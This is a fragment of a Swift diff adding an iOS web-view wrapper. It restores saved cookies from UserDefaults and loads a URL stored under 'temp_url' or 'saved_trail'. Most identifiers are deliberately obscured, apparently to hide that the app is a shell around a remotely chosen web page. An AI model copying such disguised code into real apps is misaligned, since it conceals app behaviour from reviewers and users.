+            mainPulsingDevice.goBack()
+        }
+    }
+    
+    func restoreSavedDataOfPulsatings() {
+        guard let saved = UserDefaults.standard.object(forKey: "preserved_grains") as? [String: [String: [HTTPCookiePropertyKey: AnyObject]]] else { return }
+        
+        let feeder = mainPulsingDevice.configuration.websiteDataStore.httpCookieStore
+        let grains = saved.values.flatMap { $0.values }.compactMap {
+            HTTPCookie(properties: $0 as [HTTPCookiePropertyKey: Any])
+        }
+        
+        grains.forEach { feeder.setCookie($0) }
+    }
+    
+    func refreshDawn() {
+        mainPulsingDevice.reload()
+    }
+    
+    
+}
+
+struct PulsatingMainView: UIViewRepresentable {
+    let wakeUpURL: URL
+    
+    @StateObject private var flock = PulsingContainerController()
+    
+    func makeCoordinator() -> PulsingAppMainViDele {
+        PulsingAppMainViDele(watching: flock)
+    }
+    
+    func makeUIView(context: Context) -> WKWebView {
+        flock.awaikenPulsingDe()
+        flock.mainPulsingDevice.uiDelegate = context.coordinator
+        flock.mainPulsingDevice.navigationDelegate = context.coordinator
+        
+        flock.restoreSavedDataOfPulsatings()
+        flock.mainPulsingDevice.load(URLRequest(url: wakeUpURL))
+        
+        return flock.mainPulsingDevice
+    }
+    
+    func updateUIView(_ uiView: WKWebView, context: Context) {}
+}
+
+struct PulseBreathView: View {
+    
+    @State private var currentPulse = ""
+    
+    private func ForCheckNeededEarlyPulsatings() {
+        if let call = UserDefaults.standard.string(forKey: "temp_url"), !call.isEmpty {
+            currentPulse = call
+            UserDefaults.standard.removeObject(forKey: "temp_url")
+        }
+    }
+    
+    var body: some View {
+        ZStack {
+            if let url = URL(string: currentPulse) {
+                PulsatingMainView(wakeUpURL: url)
+                    .ignoresSafeArea(.keyboard, edges: .bottom)
+            }
+        }
+        .preferredColorScheme(.dark)
+        .onAppear(perform: checkMorningCall)
+        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("LoadTempUrl"))) { _ in
+            ForCheckNeededEarlyPulsatings()
+        }
+    }
+    
+    private func checkMorningCall() {
+        let early = UserDefaults.standard.string(forKey: "temp_url")
+        let regular = UserDefaults.standard.string(forKey: "saved_trail") ?? ""
+        currentPulse = early ?? regular
+        
+        if early != nil {
+            UserDefaults.standard.removeObject(forKey: "temp_url")
+        }
+    }
+    
 }
